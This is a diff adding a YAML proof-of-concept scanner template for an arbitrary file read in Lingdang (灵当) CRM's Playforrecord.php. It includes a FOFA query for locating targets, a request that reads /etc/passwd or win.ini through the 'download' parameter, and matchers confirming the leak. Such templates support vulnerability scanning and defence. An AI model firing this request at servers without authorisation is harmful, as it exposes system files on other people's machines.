@@ -1,0 +1,21 @@
+id: poc-yaml-51mis-crm-playforrecord-php-anyfile-read
+info:
+  name: 灵当CRM Playforrecord.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 灵当CRM
+  fofa: body="http://localhost:8088/crm/index.php"
+variables:
+  paths: 'c:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /crm/modules/Accounts/Playforrecord.php?download=file:///{{.paths}}
+  expression: (status_code == 200 && contains(content_type,"application/octet-stream"))
+    && ( (contains(body,"root:") && contains(body,"/bin")) || (contains(body,"[files]")
+    && contains(body,"bit app support")) )
+transport: http
